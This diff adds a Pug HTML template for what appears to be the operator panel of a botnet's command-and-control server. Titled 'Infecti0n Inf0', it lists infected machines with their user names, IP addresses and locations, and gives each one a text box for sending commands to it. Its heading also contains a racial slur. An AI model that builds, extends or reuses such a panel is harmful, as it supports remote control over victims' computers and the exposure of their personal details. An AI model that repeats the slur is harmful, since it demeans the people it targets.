@@ -1,0 +1,70 @@
+html
+  head
+    meta(charset='utf-8')
+    |     
+    meta(name='viewport', content='width=device-width, initial-scale=1')
+    |     
+    link(rel='stylesheet', href='stylesheets/bootstrap-custom.css')
+    link(rel='stylesheet', href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css')
+    link(rel='stylesheet', href='https://use.fontawesome.com/releases/v5.0.13/css/all.css')
+    |     
+    script(src='https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js')
+    |     
+    script(src='https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js')
+    script(src='javascripts/main.js')
+
+  |   
+  body(style='background-color:#EEEEEE')
+    .k1
+      .container(style='padding-top:40px')
+        .n
+          h2
+            span#a Infecti0n Inf0
+            span#b , mah Nigga
+          p(style='position:relative;left:3px;') #{hello}
+          a(href='/bots')
+            button.btn.btn-primary(type='button') Bots
+          a(href='/commands')
+            button.btn.btn-primary(type='button') Commands
+          a(href='/')
+            button.btn.btn-primary(type='button') Home
+          a(href='#')
+            button.btn.btn-primary(type='button') Delete
+          a(href='/logout')
+            button.btn.btn-primary(type='button') Logout
+          br
+          br
+          table.table.table-bordered
+            thead
+              tr
+                th.text-left Bot_id
+                | &#x9;&#x9;&#x9;
+                th.text-left Name
+                | &#x9;&#x9;&#x9;
+                th.text-left IP
+                | &#x9;&#x9;&#x9;
+                th.text-left Location
+                | &#x9;&#x9;&#x9;
+                th.text-left -
+                | &#x9;&#x9;&#x9;
+            tbody.table-hover
+              each entry, index in result
+                tr
+                  td.text-left=entry._id
+                  | &#x9;&#x9;&#x9;
+                  td=entry.consolename + '/' + entry.username
+                  | &#x9;&#x9;&#x9;
+                  td.text-left()=entry.ip
+                  | &#x9;&#x9;&#x9;
+                  td(rowspace='2')=entry.location
+                  | &#x9;&#x9;&#x9;
+                  td
+                    button(style='color:black;border-width:1px;', onclick='comp_fun(#{index})')
+                      i(id="#{index}c").fas.fa-caret-down
+                tr(style='display:none;background:rgb(230,230,230);' id="#{index}a")
+                  td Registered Time
+                  td(colspan="2")=entry.registered_time
+                  td(colspan="2")
+                    input(type="text" name="command" placeholder="Command" style="background:#EEEEEE;")
+                    &nbsp;&nbsp;
+                    input(type="submit" value="./")
